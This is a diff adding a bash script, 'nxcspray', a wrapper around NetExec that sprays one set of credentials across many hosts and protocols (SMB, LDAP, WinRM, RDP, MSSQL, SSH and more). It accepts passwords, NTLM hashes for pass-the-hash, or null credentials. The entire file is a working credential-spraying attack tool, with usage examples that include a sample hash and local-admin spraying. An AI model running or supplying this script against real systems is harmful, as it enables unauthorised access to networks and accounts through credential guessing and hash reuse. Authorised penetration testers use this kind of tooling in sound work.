@@ -1,0 +1,126 @@
+#!/bin/bash
+# Usage:
+#   nxcspray <protocols|all> <targets> -u <username> -p <password> [options]
+#   nxcspray <protocols|all> <targets> -u <username> -H <ntlm_hash> [options]
+#   nxcspray <protocols|all> <targets> -u '' -p '' [options]          # null / passwordless
+#
+# Options:
+#   --local-auth       Pass --local-auth to nxc
+#   --no-bruteforce    Pass --no-bruteforce to nxc
+#
+# Examples:
+#   nxcspray all 10.10.10.10 -u bob -p password
+#   nxcspray smb,ldap hosts.txt -u '' -p ''
+#   nxcspray smb targets.txt -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth
+#   nxcspray smb ip -u bob -p 'Pass123!' --no-bruteforce --local-auth
+
+if [ "$#" -lt 2 ]; then
+    echo "[-] Usage: $0 <protocols|all> <targets> [-u <username>] [-p <password> | -H <hash>] [--local-auth] [--no-bruteforce]"
+    exit 1
+fi
+
+PROTOS_RAW="$1"
+TARGETS_RAW="$2"
+shift 2
+
+USER=""
+PASS=""
+HASH=""
+LOCAL_AUTH=0
+NO_BRUTEFORCE=0
+USER_SET=0
+PASS_SET=0
+
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        -u)
+            USER_SET=1
+            if [[ $# -lt 2 || "$2" == -* ]]; then
+                USER=""
+                shift 1
+            else
+                USER="$2"
+                shift 2
+            fi
+            ;;
+        -p)
+            PASS_SET=1
+            if [[ $# -lt 2 || "$2" == -* ]]; then
+                PASS=""
+                shift 1
+            else
+                PASS="$2"
+                shift 2
+            fi
+            ;;
+        -H)
+            if [[ $# -lt 2 ]]; then
+                echo "[-] -H requires a hash"
+                exit 1
+            fi
+            HASH="$2"
+            shift 2
+            ;;
+        --local-auth)
+            LOCAL_AUTH=1
+            shift
+            ;;
+        --no-bruteforce)
+            NO_BRUTEFORCE=1
+            shift
+            ;;
+        *)
+            echo "[-] Invalid argument: $1"
+            exit 1
+            ;;
+    esac
+done
+
+# Allow empty user (null auth). Require -u was at least provided.
+if [ "$USER_SET" -eq 0 ]; then
+    echo "[-] Missing required flag: -u <username> (use -u '' for null auth)"
+    exit 1
+fi
+
+# Allow empty password (passwordless). Require -p or -H.
+if [ "$PASS_SET" -eq 0 ] && [ -z "$HASH" ]; then
+    echo "[-] Provide -p <password> (or -p '' for empty) or -H <hash>"
+    exit 1
+fi
+
+if [ "$PASS_SET" -eq 1 ] && [ -n "$HASH" ]; then
+    echo "[-] Provide either -p or -H, not both"
+    exit 1
+fi
+
+# Extra nxc flags
+EXTRA_ARGS=()
+[ "$LOCAL_AUTH" -eq 1 ] && EXTRA_ARGS+=(--local-auth)
+[ "$NO_BRUTEFORCE" -eq 1 ] && EXTRA_ARGS+=(--no-bruteforce)
+
+# Protocols
+if [ "$PROTOS_RAW" = "all" ]; then
+    PROTO_ARRAY=(smb ldap winrm rdp mssql ssh ftp wmi vnc nfs)
+else
+    IFS=',' read -ra PROTO_ARRAY <<< "$PROTOS_RAW"
+fi
+
+# Targets
+if [ -f "$TARGETS_RAW" ]; then
+    TARGETS=$(cat "$TARGETS_RAW")
+else
+    TARGETS="$TARGETS_RAW"
+fi
+
+# Spray
+for PROTO in "${PROTO_ARRAY[@]}"; do
+    echo "[+] Spraying protocol: $PROTO"
+    for TARGET in $TARGETS; do
+        echo "    -> Target: $TARGET"
+        if [ "$PASS_SET" -eq 1 ]; then
+            nxc "$PROTO" "$TARGET" -u "$USER" -p "$PASS" "${EXTRA_ARGS[@]}"
+        else
+            nxc "$PROTO" "$TARGET" -u "$USER" -H "$HASH" "${EXTRA_ARGS[@]}"
+        fi
+    done
+done
